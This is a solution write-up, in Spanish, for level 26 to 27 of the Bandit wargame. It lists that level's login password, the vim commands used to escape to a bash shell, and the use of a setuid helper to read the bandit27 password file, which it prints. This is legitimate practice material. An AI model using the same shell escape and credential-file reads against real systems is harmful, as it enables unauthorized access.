## Objetivo
Good job getting a shell! Now hurry and grab the password for bandit27!
## Datos de acceso al nivel
Usuario: bandit26
Contraseña: c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
## Solución

antes es:
	!
	set shell?
	:set shell=/bin/bash
	:sh
```
bandit26@bandit:~$ ./bandit27-do
Run a command as another user.
  Example: ./bandit27-do id
bandit26@bandit:~$ ./bandit27-do  id
uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
bandit26@bandit:~$ ./bandit27-do  cat /atc/bandit_pass/bandit27
cat: /atc/bandit_pass/bandit27: No such file or directory
bandit26@bandit:~$ ./bandit27-do  cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
```
## Notas Adicionales
## Referencias
